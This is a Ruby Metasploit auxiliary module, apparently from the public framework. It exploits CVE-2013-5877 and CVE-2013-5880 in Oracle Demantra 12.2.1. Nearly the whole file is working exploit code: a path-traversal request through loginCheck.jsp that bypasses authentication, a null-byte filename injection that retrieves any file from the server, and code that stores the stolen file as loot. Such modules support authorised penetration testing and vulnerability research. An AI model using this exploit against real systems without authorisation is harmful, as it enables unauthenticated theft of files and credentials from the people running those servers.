##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Demantra Arbitrary File Retrieval with Authentication Bypass',
      'Description'    => %q{
       This module exploits a file downlad vulnerability found in Oracle Demantra 12.2.1 in combination with an authentication bypass.
       This way an unauthenticated user can retreive any file on the system by referencing the full file path to any file a vulnerable machine.
      },
      'References'     =>
        [
          [ 'CVE', '2013-5877', '2013-5880'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/',
                   'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]
        ],
      'Author'         =>
        [
          'Oliver Gruskovnjak'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "January 2014"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('SSL',   [false, 'Use SSL', false]),
        OptString.new('FILEPATH', [true, 'The name of the file to download', 'c:/windows/win.ini'])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    filename = datastore['FILEPATH']

    res = send_request_raw({
      'uri' => "/demantra/common/loginCheck.jsp/../../GraphServlet",
      'method' => 'POST',
      'ctype'    => 'application/x-www-form-urlencoded',
      'data' => "filename=#{filename}%00",
    })


    if res.nil? or res.body.empty?
      print_error("No content retrieved from: #{ip}")
      return
    end

    if res.code == 404
      print_error("#{rhost}:#{rport} - File not found")
      return
    end

    if res.code == 200
      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
    end

    if res.body.empty?
      print_error("#{ip}:#{rport} - Empty response, no file downloaded")
    else
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'oracle.demantra',
        'application/octet-stream',
        ip,
        res.body,
        fname)

      print_status("#{ip}:#{rport} - File saved in: #{path}")
    end
  end

end
